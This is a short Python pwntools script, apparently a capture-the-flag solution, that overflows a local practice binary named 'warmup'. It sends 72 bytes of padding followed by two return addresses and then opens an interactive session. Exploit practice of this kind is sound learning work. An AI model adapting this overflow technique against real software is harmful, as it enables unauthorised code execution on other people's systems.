from pwn import *
pay = b""
pay += b"A" * 72
pay += p64(0x04004a1)
pay += p64(0x40060d)
p = process("./warmup")
p.recvuntil(b">")
p.sendline(pay)
p.interactive()
